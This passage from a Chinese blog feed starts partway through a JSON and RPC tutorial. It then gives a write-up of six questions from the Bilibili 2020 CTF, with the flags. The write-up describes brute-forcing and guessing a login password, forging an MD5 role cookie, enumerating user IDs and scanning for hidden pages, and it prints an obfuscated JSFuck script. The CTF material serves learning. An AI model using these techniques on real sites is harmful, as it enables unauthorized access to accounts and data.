通用性相对略低。</li><li>从我们项目的核心——云边融合控制器管理入手，我们在选取不同的数据交换格式时，不仅要考虑语言的可读性，通用性，实现难度，响应速度等基本因素，还要考虑数据在网络中的传输速度、安全性等问题。因此，我认为JSON是完美契合我们需求的选择。</li></ul><h2 id="JSON基础语法"><a href="#JSON基础语法" class="headerlink" title="JSON基础语法"></a>JSON基础语法</h2><p><strong>JSON语法是JavaScript语法的子集</strong></p><p><em>JSON基础语法规则:</em></p><ul><li>数据在名称/值对中</li><li>数据由逗号分隔</li><li>花括号保存对象</li><li>方括号保存数组</li></ul><p><strong>JSON 名称/值对</strong></p><p>JSON数据的书写格式：名称/值对</p><p>例如：</p><blockquote><p>“firstName”:”John”</p></blockquote><p>他等价于</p><blockquote><p>firstName = “John”</p></blockquote><p><strong>JSON值</strong></p><p><em>JSON值包括:</em></p><ul><li>数字（整数或浮点数）</li><li>字符串（在双引号中）</li><li>逻辑值（true或false）</li><li>数组（在方括号中）</li><li>对象（在花括号中）</li><li>null</li></ul><p><strong>JSON 对象</strong></p><p><em>JSON对象在花括号中书写</em>,例如：</p><blockquote><p>{“firstName”:”John”,”lastName”:”Doe”}</p></blockquote><p>他等价于</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">firstName &#x3D; &quot;John&quot;</span><br><span class="line">lastName &#x3D; &quot;Doe&quot;</span><br></pre></td></tr></table></figure></div><p><strong>JSON数组</strong></p><p><em>JSON数组在方括号中书写</em>,数组可以包含多个对象。例如:</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;employess&quot;:[</span><br><span class="line">&#123;&quot;firstName&quot;:&quot;John&quot;:&quot;Doe&quot;&#125;,</span><br><span class="line">&#123; &quot;firstName&quot;:&quot;Anna&quot; , &quot;lastName&quot;:&quot;Smith&quot; &#125;,</span><br><span class="line">&#123; &quot;firstName&quot;:&quot;Peter&quot; , &quot;lastName&quot;:&quot;Jones&quot; &#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><strong>JSON使用JavaScript语法</strong></p><p>通过JavaScript,我们可以创建一个对象数组，并直接进行赋值：</p><pre><code>var employees = [{ &quot;firstName&quot;:&quot;Bill&quot; , &quot;lastName&quot;:&quot;Gates&quot; },{ &quot;firstName&quot;:&quot;George&quot; , &quot;lastName&quot;:&quot;Bush&quot; },{ &quot;firstName&quot;:&quot;Thomas&quot; , &quot;lastName&quot;: &quot;Carter&quot; }];</code></pre><p>访问数组</p><blockquote><p>employees[0].lastName;</p></blockquote><p>返回值</p><blockquote><p>Gates</p></blockquote><p>修改数据</p><blockquote><p>employees[0].lastName = “Jobs”;</p></blockquote><p><strong>JSON文件</strong></p><ul><li>JSON文件的文件类型“.json”</li><li>JSON文本的MIME类型是”applicatio/json”</li></ul><h1 id="JSON-RPC部分"><a href="#JSON-RPC部分" class="headerlink" title="JSON-RPC部分"></a>JSON-RPC部分</h1><h2 id="什么是RPC？"><a href="#什么是RPC？" class="headerlink" title="什么是RPC？"></a>什么是RPC？</h2><p><strong>RPC</strong> ： 即Remote Procedure Call Protocol、远程过程调用协议。它是一种通过网络从远程计算机程序上请求服务，而不需要了解底层网络技术的协议。</p><p>RPC协议通过某些传输协议来实现，如传输二进制数据的Socket协议，为通信程序之间携带信息数据。在OSI网络通讯模型中，RPC跨越了传输层和应用层，使得开发包括微服务在内的应用程序更加容易。</p><ul><li>RPC指的是远程过程调用，简而言之，<strong>RPC是从一台机器上通过参数传递的方式调用另一台机器上的一个函数或方法并得到响应结果的方法。</strong></li><li>RPC<strong>隐藏</strong>底层的通讯细节。</li><li>RPC是一个<strong>请求响应模型</strong>，客户端发起请求，服务器返回响应。</li><li>RPC在使用形式上像<strong>调用本地函数</strong>一样去调用远程的函数。</li></ul><h2 id="我们为什么需要使用RPC"><a href="#我们为什么需要使用RPC" class="headerlink" title="我们为什么需要使用RPC"></a>我们为什么需要使用RPC</h2><p>随着现代计算机网络应用的不断进化，大型项目所包含的业务越来越多，应用也越来越多。我们发现有些功能已经不能简单划分开来，甚至无法在一个进程内或一个计算机内通过本地调用的方式完成需求，比如不同系统、不同组织间的通讯。由于对计算能力提出了横向扩展的需求，我们需要在多台机器组成的集群上部署应用。此时，我们将公共业务逻辑抽离出来，将之改组为独立的Service应用。而原有或新增的应用都可以与那些独立的Service应用相交互，以此来构成完整的业务逻辑。因此，RPC的诸多特性使其成为了我们完成以上任务的重要手段。</p><h2 id="RPC的具体原理"><a href="#RPC的具体原理" class="headerlink" title="RPC的具体原理"></a>RPC的具体原理</h2><p>本例中我们使用<strong>Google Protolcol Buffer</strong>实现序列化。</p><p><a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/RPC_1.jpg" data-fancybox="group" data-caption="RPC例" class="fancybox"><img alt="RPC例" title="RPC例" data-src="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/RPC_1.jpg" class="lazyload"></a></p><p>先在RPC中注册callMethod函数，在服务端注册相同的callMethod。调用客户端向服务端发送命令，传送相应的命令和键值，调用callMethod函数实现序列化和反序列化，封包，发送消息。<br>将callMethod函数序列化后的结果发送到服务端，服务端收到消息后，使用callMethod函数进行反序列化，并根据其内容提供Service服务进行响应，对需要反馈的数据通过callMethod函数进行序列化，再将序列化后的结果发送给客户端，最终客户端进行反序列化，处理序列化的结果，完成一个完整的请求——处理——反馈的流程</p><p>同样的，JSON也可以实现如上图的流程</p><hr><p>接下来我们再从内部视角探究RPC的结构</p><p><a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/RPC_2.jpg" data-fancybox="group" data-caption="RPC例" class="fancybox"><img alt="RPC例" title="RPC例" data-src="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/RPC_2.jpg" class="lazyload"></a></p><p>示例：</p><ul><li>RpcServer<br>负责导出（export）远程接口</li><li>RpcClient<br>负责导入（import）远程接口的代理实现</li><li>RpcProxy<br>远程接口的代理实现</li><li>RpcInvoker<br>客户端实现：负责编码调用信息和发送调用请求到服务端并等待调用结果返回<br>服务端实现：负责调用服务端接口的具体实现并返回调用结果</li><li>RpcProtocol<br>负责协议编/解码</li><li>RpcConnector<br>负责维持客户端和服务端的连接通道和发送数据到服务端</li><li>RpcAcceptor<br>负责接收客户端请求并返回请求结果</li><li>RpcProcessor<br>负责在服务端控制调用过程，包括管理调用线程池、超时时间等</li><li>RpcChannel<br>数据传输通道</li></ul><p>RPC服务端通过RpcServer去导出远程接口方法，而客户端通过RpcClient去引入远程接口方法。<br>客户端像调用本地方法一样去调用远程接口方法，RPC框架提供接口的代理实现，实际的调用将委托给代理RpcProxy。 代理封装调用信息并将调用转交给RpcInvoker去实际执行。在客户端的RpcInvoker通过连接器RpcConnector去维持与服务端的通道RpcChannel，并使用RpcProtocol执行协议编码并将编码后的请求消息通过通道发送给服务端。<br>RPC 服务端接收器RpcAcceptor接收客户端的调用请求，同样使用RpcProtocol执行协议解码。解码后的调用信息传递给RpcProcessor去控制处理调用过程，最后再委托调用给RpcInvoker去实际执行并返回调用结果。[1]</p><h2 id="Java中常用的几种RPC框架"><a href="#Java中常用的几种RPC框架" class="headerlink" title="Java中常用的几种RPC框架"></a>Java中常用的几种RPC框架</h2><ul><li><p>RMI（远程方法调用）<br>RMI是JAVA自带的远程方法调用工具，作为JAVA语言最开始时的设计，在现在的应用环境中已经具有了一定的局限性。后来很多框架的原理都基于该框架。</p></li><li><p>Hessian（基于HTTP的远程方法调用）<br>Hessian基于HTTP协议传输，在性能方面还不够完美，负载均衡和失效转移依赖于应用的负载均衡器。Hessian的使用与RMI类似，区别在于淡化了Registry的角色，通过显示的地址调用，利用HessianProxyFactory根据配置的地址create一个代理对象，另外还要引入Hessian的Jar包。</p></li><li><p>Dubbo（淘宝开源的基于TCP的RPC框架）<br>Dubbo是基于Netty的高性能RPC框架，由阿里巴巴开源。它是一个分布式的服务框架与SOA治理方案。其功能主要包括：高性能NIO通讯及多协议集成，服务动态寻址与路由，软负载均衡与容错，依赖分析与降级等。自2011年开源后，已被许多非阿里系公司使用。</p></li></ul><h2 id="引用-资料来源"><a href="#引用-资料来源" class="headerlink" title="引用/资料来源"></a>引用/资料来源</h2><p>[1]From：RPC原理详解</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JSON </tag>
            
            <tag> JSON-RPC </tag>
            
            <tag> 综合设计 </tag>
            
            <tag> IOT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bilibili_2020_1024程序员节Ctf</title>
      <link href="/post/6d0a3683.html"/>
      <url>/post/6d0a3683.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>1024，一年一度的程序员节。你好，世界！你好，程序员！<br>（但是 2 0 2 0 - 1 0 2 4 … hhh<br>就在10.24的0点，Bilibili为大家献上了一份大礼：Bilibili_CTF_2020<br>经过了艰苦卓绝（~并不 的奋战，我终于拿到了70 of 100 的分数（平 均 水 平<br>接下来带来这7道题的解析，希望能够成为对Ctf新手的指引吧<br><a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/bilisrc.jpg" data-fancybox="group" data-caption="Alt text" class="fancybox"><img alt="Alt text" title="Alt text" data-src="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/bilisrc.jpg" class="lazyload"></a><br><code>守护世界上最好的睿叔！(笑</code></p><h1 id="Question-ID-1-页面的背后是什么？"><a href="#Question-ID-1-页面的背后是什么？" class="headerlink" title="Question_ID_1 页面的背后是什么？"></a>Question_ID_1 页面的背后是什么？</h1><p>题目地址:<code>http://45.113.201.36/index.html</code></p><h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>顾名思义，页面的背后就是源代码啦~<br>F12检查元素，得到第一题的源码如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">    url: &quot;api&#x2F;admin&quot;,</span><br><span class="line">    type: &quot;get&quot;,</span><br><span class="line">    success:function (data) &#123;</span><br><span class="line">        &#x2F;&#x2F;console.log(data);</span><br><span class="line">        if (data.code &#x3D;&#x3D; 200)&#123;</span><br><span class="line">            &#x2F;&#x2F; 如果有值：前端跳转</span><br><span class="line">            var input &#x3D; document.getElementById(&quot;flag1&quot;);</span><br><span class="line">            input.value &#x3D; String(data.data);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;&#x2F; 如果没值</span><br><span class="line">            $(&#39;#flag1&#39;).html(&quot;接口异常，请稍后再试～&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div><p>根据提示修改url为<code>http://45.113.201.36/api/admin</code>,页面返回<code>{&quot;code&quot;:200,&quot;data&quot;:&quot;9eaf84d8-0336b140-23185a95-13d5825f&quot;,&quot;msg&quot;:&quot;&quot;}</code><br>在依据代码逻辑，我们确定Flag1为<code>9eaf84d8-0336b140-23185a95-13d5825f</code></p><h1 id="Question-ID-2-真正的秘密只有特殊的设备才能看到"><a href="#Question-ID-2-真正的秘密只有特殊的设备才能看到" class="headerlink" title="Question_ID_2 真正的秘密只有特殊的设备才能看到"></a>Question_ID_2 真正的秘密只有特殊的设备才能看到</h1><p>题目地址:<code>http://45.113.201.36/index.html</code></p><h2 id="解析-1"><a href="#解析-1" class="headerlink" title="解析"></a>解析</h2><p>诶？特殊的设备？<br>还是老老实实检查元素吧~<br><a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/Bilibili_Ctf1.jpg" data-fancybox="group" data-caption="Alt text" class="fancybox"><img alt="Alt text" title="Alt text" data-src="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/Bilibili_Ctf1.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    url: &quot;api&#x2F;ctf&#x2F;2&quot;,</span><br><span class="line">    type: &quot;get&quot;,</span><br><span class="line">    success:function (data) &#123;</span><br><span class="line">        &#x2F;&#x2F;console.log(data);</span><br><span class="line">        if (data.code &#x3D;&#x3D; 200)&#123;</span><br><span class="line">            &#x2F;&#x2F; 如果有值：前端跳转</span><br><span class="line">            $(&#39;#flag2&#39;).html(&quot;flag2: &quot; + data.data);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            &#x2F;&#x2F; 如果没值</span><br><span class="line">            $(&#39;#flag2&#39;).html(&quot;需要使用bilibili Security Browser浏览器访问～&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></div><p>可是，<code>需要使用bilibili Security Browser浏览器访问～</code>又是什么意思呢？<br>对了！我们可以修改UA标识！！<br>F12检查元素，模拟设备，添加自定义设备！<br>我们加入一个名为bilibili Security Browser的新设备，刷新页面发现并没有得出Flag<br>索性把所有涉及设备的参数设置为bilibili Security Browser，F5刷新后，就得到了Flag~<br>Flag2:<code>be74383e-0b87bbde-40c0c5c4-da62eec3</code></p><h1 id="Question-ID-3-密码是啥？"><a href="#Question-ID-3-密码是啥？" class="headerlink" title="Question_ID_3 密码是啥？"></a>Question_ID_3 密码是啥？</h1><p>题目地址:<code>http://45.113.201.36/login.html</code></p><h2 id="解析-2"><a href="#解析-2" class="headerlink" title="解析"></a>解析</h2><p>F12康康代码逻辑</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F;falg 3</span><br><span class="line"></span><br><span class="line">$(&quot;#submit&quot;).click(function()&#123;</span><br><span class="line">    </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: &quot;api&#x2F;ctf&#x2F;3&quot;,</span><br><span class="line">        type: &quot;post&quot;,</span><br><span class="line">        contentType: &quot;application&#x2F;json&quot;,</span><br><span class="line">        dataType:&quot;json&quot;,</span><br><span class="line">        data: JSON.stringify(&#123;</span><br><span class="line">            username: $(&quot;#name&quot;).val(),</span><br><span class="line">            passwd: $(&quot;#subject&quot;).val(),</span><br><span class="line">        &#125;),</span><br><span class="line">        success:function (data) &#123;</span><br><span class="line">            if (data.code &#x3D;&#x3D; 200)&#123;</span><br><span class="line">                alert(&quot;flag is: &quot; + data.data);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                alert(&quot;用户名或密码错误～&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure></div><p><a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BILIBILICTF2.jpg" data-fancybox="group" data-caption="Alt text" class="fancybox"><img alt="Alt text" title="Alt text" data-src="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BILIBILICTF2.jpg" class="lazyload"></a><br>密码是什么呢？首先考虑密码爆破！<br>跑完了字典，但是密码并没有试出来……<br>简单想想，用户名应该就是admin没得跑，那么密码是什么呢？<br>最终猜测得到bilibili = = （CTF× 猜 灯 谜√</p><p>Flag3:<code>3f06bf77-e57dad87-a669c72b-4d8b296b</code></p><h1 id="Question-ID-4-对不起，权限不足～"><a href="#Question-ID-4-对不起，权限不足～" class="headerlink" title="Question_ID_4 对不起，权限不足～"></a>Question_ID_4 对不起，权限不足～</h1><p>题目地址:<code>http://45.113.201.36/superadmin.html</code></p><p><a href="undefined" data-fancybox="group" data-caption="Alt text" class="fancybox"><img alt="Alt text" title="Alt text" data-src class="lazyload"></a></p><h2 id="解析-3"><a href="#解析-3" class="headerlink" title="解析"></a>解析</h2><p><a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BILIBILICTF3.jpg" data-fancybox="group" data-caption="Alt text" class="fancybox"><img alt="Alt text" title="Alt text" data-src="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BILIBILICTF3.jpg" class="lazyload"></a><br>F12!</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">     url: &quot;api&#x2F;ctf&#x2F;4&quot;,</span><br><span class="line">     type: &quot;get&quot;,</span><br><span class="line">     success:function (data) &#123;</span><br><span class="line">         console.log(data);</span><br><span class="line">         if (data.code &#x3D;&#x3D; 200)&#123;</span><br><span class="line">             &#x2F;&#x2F; 如果有值：前端跳转</span><br><span class="line">             $(&#39;#flag&#39;).html(&quot;欢迎超级管理员登陆～答案是 : &#123;&#123; &quot; + data.data + &quot; &#125;&#125;&quot;.toLowerCase() )</span><br><span class="line">         &#125; else &#123;</span><br><span class="line">             &#x2F;&#x2F; 如果没值</span><br><span class="line">             $(&#39;#flag&#39;).html(&quot;有些秘密只有超级管理员才能看见哦~&quot;)</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;)</span><br></pre></td></tr></table></figure></div><p>好家伙，我直接懵逼.jpg<br>打开Fiddler抓个包~<br>查看返回包的Cookie时候，发现了有意思的东西:<br><code>Cookie: role=ee11cbb19052e40b07aac0ca060c23ee; session=eyJ1aWQiOiIzNzIwODMyMSJ9.X5Qnkw.1NWStBUpUlAWQhYOM9av9W_qEWA</code><br>这个role值就很耐人寻味呀~似乎是一个加密后的字符串？<br>尝试解码，初步确定是MD5加密后的结果，且解密为admin字符串<br>那么思路就应该是替换Cookie的字段值了。将superadmin采用md5加密，利用EditThisCookie插件修改role值，居然不对！<br>猜来猜去，administrator,Superadmin,SuperAdmin……<br>最终正确答案为Administrator【md5:7b7bc2512ee1fedcd76bdc68926d4f7b】 = = 万万没想到啊！<br>修改Cookie后刷新页面，就会返回正确的Flag啦！<br>Flag5:<code>126fb903-b39dfd0d-0bf68925-219cd931</code></p><h1 id="Question-ID-5-别人的秘密"><a href="#Question-ID-5-别人的秘密" class="headerlink" title="Question_ID_5 别人的秘密"></a>Question_ID_5 别人的秘密</h1><p>题目地址:<code>http://45.113.201.36/user.html</code></p><h2 id="解析-4"><a href="#解析-4" class="headerlink" title="解析"></a>解析</h2><p>并看不懂= =，管他的，F12！<br><a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BILIBILICTF5.jpg" data-fancybox="group" data-caption="Alt text" class="fancybox"><img alt="Alt text" title="Alt text" data-src="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BILIBILICTF5.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$(function () &#123;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    (function ($) &#123;</span><br><span class="line">        $.getUrlParam &#x3D; function(name) &#123;</span><br><span class="line">            var reg &#x3D; new RegExp(&quot;(^|&amp;)&quot; + name + &quot;&#x3D;([^&amp;]*)(&amp;|$)&quot;);</span><br><span class="line">            var r &#x3D; window.location.search.substr(1).match(reg);</span><br><span class="line">            if (r !&#x3D; null) return unescape(r[2]); return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)(jQuery);</span><br><span class="line"></span><br><span class="line">    var uid &#x3D; $.getUrlParam(&#39;uid&#39;);</span><br><span class="line">    if (uid &#x3D;&#x3D; null) &#123;</span><br><span class="line">        uid &#x3D; 100336889;</span><br><span class="line">    &#125;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: &quot;api&#x2F;ctf&#x2F;5?uid&#x3D;&quot; + uid,</span><br><span class="line">        type: &quot;get&quot;,</span><br><span class="line">        success:function (data) &#123;</span><br><span class="line">            console.log(data);</span><br><span class="line">            if (data.code &#x3D;&#x3D; 200)&#123;</span><br><span class="line">                &#x2F;&#x2F; 如果有值：前端跳转</span><br><span class="line">                $(&#39;#flag&#39;).html(&quot;欢迎超级管理员登陆～flag : &quot; + data.data )</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                &#x2F;&#x2F; 如果没值</span><br><span class="line">                $(&#39;#flag&#39;).html(&quot;这里没有你想要的答案～&quot;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div><p>原来如此！遍历！遍历！！<br>用Get方法，以<code>http://45.113.201.36/api/ctf/5?uid=100336889</code>为基准，uid++向上遍历！<br>遍历到<code>http://45.113.201.36/api/ctf/5?uid=100336913</code>的时候，服务端返回了code:200！<br><code>{&quot;code&quot;:200,&quot;data&quot;:&quot;314ebf97-6bc0234f-b906e013-52b47f23&quot;,&quot;msg&quot;:&quot;&quot;}</code><br>(果然是“别人的秘密”呀</p><p>那么，Flag5:<code>314ebf97-6bc0234f-b906e013-52b47f23</code></p><h1 id="Question-ID-6-结束亦是开始"><a href="#Question-ID-6-结束亦是开始" class="headerlink" title="Question_ID_6 结束亦是开始"></a>Question_ID_6 结束亦是开始</h1><p>题目地址:<code>http://45.113.201.36/blog/single.php?id=1</code></p><h2 id="解析-5"><a href="#解析-5" class="headerlink" title="解析"></a>解析</h2><p>终于我们进入了动态页面的世界~<br><a href="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BILIBILICTF6.jpg" data-fancybox="group" data-caption="Alt text" class="fancybox"><img alt="Alt text" title="Alt text" data-src="https://cosmos-1301148362.cos.ap-chengdu.myqcloud.com/Images/BILIBILICTF6.jpg" class="lazyload"></a><br>扫描！扫描！<br>我们得到了两个页面:end.php和test.php<br>end.php就和他的名字一样，空白的页面，和一句<strong>你想要的不在这儿～</strong><br>而test.php就有趣的多了:页面返回内容如下</p><h3 id="内容（建议跳过"><a href="#内容（建议跳过" class="headerlink" title="内容（建议跳过"></a>内容（建议跳过</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+&#123;&#125;)[!+[]+!![]+!</span><br><span class="line"></span><br><span class="line">………（太长啦~</span><br><span class="line"></span><br><span class="line">+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+&#123;&#125;)[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+[]))+([]+&#123;&#125;)[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+(+!![][]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+&#123;&#125;)[+!![]]+([]+&#123;&#125;)[!+[]+!![]+!![]+!![]+!![]]+(+&#123;&#125;+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+&#123;&#125;)[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]